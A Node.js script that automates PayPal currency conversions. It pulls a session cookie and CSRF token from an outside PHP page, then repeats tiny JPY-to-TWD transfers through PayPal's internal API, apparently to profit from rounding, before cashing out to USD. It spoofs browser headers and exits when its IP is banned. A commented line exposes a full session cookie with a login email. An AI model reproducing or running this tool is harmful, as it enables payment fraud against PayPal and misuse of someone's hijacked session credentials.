const fetch = require('node-fetch');
const readline = require('readline-sync');
const uuidv4 = require('uuid/v4');
const chalk = require('chalk');
var sessionnya = uuidv4();
const delay = require('delay');


const jpytwd = (csrf, cookie) => new Promise((resolve, reject) => {
    const url = 'https://www.paypal.com/myaccount/money/api/currencies/transfer'
    const badan =
    {"sourceCurrency":"JPY", "sourceAmount":2, "targetCurrency":"TWD", "_csrf":`${csrf}`}
//     {"sourceCurrency":"TWD","sourceAmount":80,"targetCurrency":"USD","_csrf":"0jj3KqPRjUEzSvTuaX0J9tf6I3UMqBznp/i28="}

    fetch(url, {
        method: 'POST',
        headers: {


  'authority': 'www.paypal.com',
    'accept': 'application/json',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4061.2 Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.paypal.com/myaccount/money/currencies/USD/transfer/JPY/review',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': `${cookie}`,




        },
        body: JSON.stringify(badan)
    })
    .then(res => res.json())
    .then(result => {
        resolve(result) // console.log(result) PENTING
    })
    .catch(err => {
        reject(err) // console.log(err) PENTING
    })

});


const usd = (cookie, csrf) => new Promise((resolve, reject) => {
    fetch (`https://www.paypal.com/myaccount/money/api/currencies/transfer`, {
        method : 'POST',
        headers : {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cookie': `${cookie}`
        },
        body: JSON.stringify({"sourceCurrency":"TWD","sourceAmount":80,"targetCurrency":"USD","_csrf":`${csrf}`})
    })
    .then(res => res.json())
    .then(result => {
        resolve(result)
    })
    .catch(err => {
        resolve(err)
    })
});

const getErza = () => new Promise((resolve, reject) => {
    fetch(`http://erzajullian.com/paypal.php`, {
        method: 'GET',
        headers: {
        
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,id;q=0.8,ar;q=0.7',
    'Cookie': '44907='

        },
        
    })
    .then(res => res.json())
        .then(result => {
            resolve(result)
        })
        .catch(err => {
            reject(result)
        })
});

(async () => {

    const data = await getErza();
    const cookie = data.cookie
    const csrf = data.csrf
    // const cookie = "LANG=en_US%3BID; X-PP-L7=1; cookie_check=yes; _ga=GA1.2.189747657.1582163777; _gat_PayPal=1; _gcl_au=1.1.930522945.1582163777; ts_c=vr%3D604f40321700a372b1a4d128fffe6477%26vt%3D604f40451700a372b1a4d128fffe6476; _gat_gtag_UA_53389718_12=1; nsid=s%3AuDTi7LqfdXHCZHJxDaywFMTMi2lN8mbw.rOVPvN1mLc6yEydzYQR7XQVfPadwBnjrKv%2BuVm2IU0s; KHcl0EuY7AKSMgfvHl7J5E7hPtK=ybx_dvT6EXYoHASTLnSrnUJ3TlhJJnD-BBX-Tls1l1kVLalXnT_oLbHYFgiV0pSKw57N1YgFE8iK_fmm; login_email=mema%40pershart.com; Obsh1bpwTE8slCzy4X2PwOLmhre=D239dslvyc-CLZxt9U2yjUsWw--A1SILjGmQ0P7mquLNFZL5_FqPLPxePcA4VAJUqR0.Aw; ui_experience=d_id%3Da40847db3ae84c63837404f9c6af5d151582163805229%26optin_displayed%3Dtrue%26login_type%3DEMAIL_PASSWORD%26home%3D2; fn_dt=55d7a9436a994cdc933bb53dc1a129c6; id_token=idtokena449bd03833c446d802dd8a7d8b78129; X-PP-ADS=AToBhOdNXnD7LMAVdpow9ebI55wrQO8; SEGM=bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ; ts=vreXpYrS%3D1676858325%26vteXpYrS%3D1582165725%26vr%3D604f40321700a372b1a4d128fffe6477%26vt%3D604f40451700a372b1a4d128fffe6476; HaC80bwXscjqZ7KM6VOxULOB534=glJpYq09OWgUvMnUuRlQ9rWD_AZGKVqmj2xhRESZeimnFkkdPiVSPYe7sF22ZMOkaVtDnFNZgBtccy4ufV2aYtxL5BsG_hgGsso_eTqmfRDRC2bnPNdD84Hkck2NyhiSUrDinm; x-pp-s=eyJ0IjoiMTU4MjE2MzkyNzAwNiIsImwiOiIwIiwibSI6IjAifQ; tsrce=authchallengenodeweb; X-PP-SILOVER=name%3DLIVE3.WEB.1%26silo_version%3D880%26app%3Dauthchallengenodeweb%26TIME%3D1582163927%26HTTP_X_PP_AZ_LOCATOR%3Ddcg12.slc; akavpau_ppsd=1582164527~id=e7340587c97be045e87ef0e8bce875d7; tcs=main%3Amoneynodeweb%3Atransfer%3AJPY%3Areview%7CreviewConversion"
    // const csrf = "sOD1NhyIhlikNjVKaXR7CMqZDZu2m6NlDrPOI="

    for (var i = 0; i < 96; i++) {
    try{

        const x = await jpytwd(csrf, cookie)
        // console.log(x)
        const jumlah = i+1
        const poin = x.balance
        if(poin === undefined){
            console.log(chalk.red("IP BANNED BOSS"))
            console.log(chalk.red("IP BANNED BOSS"))
            console.log(chalk.red("IP BANNED BOSS"))
            process.exit()
        }else{
        console.log(`SUKSES ${jumlah}`)
        const akhir = await x.balance.data.balances[2].availableBalance.total.amount;
        if(akhir === '96.00'){
            const xxx = await usd(cookie, csrf)
            console.log(chalk.yellow("SUKSES CV"));
            process.exit()
        }}


    }catch(e){
        console.log(e)
    }}

})();
